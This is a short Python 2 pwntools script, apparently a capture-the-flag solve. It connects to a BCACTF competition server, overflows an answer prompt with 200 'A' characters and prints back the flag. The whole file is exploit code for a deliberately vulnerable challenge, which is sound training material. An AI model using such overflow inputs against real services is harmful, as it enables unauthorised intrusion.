#!/usr/bin/python2
from pwn import *
host = "bin.bcactf.com"
port = 49155
s = remote(host, port)
s.recvuntil("Answer for 1: ")
s.sendline("A"*200)
s.recvuntil("BCA plagarism policy.")
print(s.recvuntil("bcactf{")[-7:] + s.recvuntil("}"))
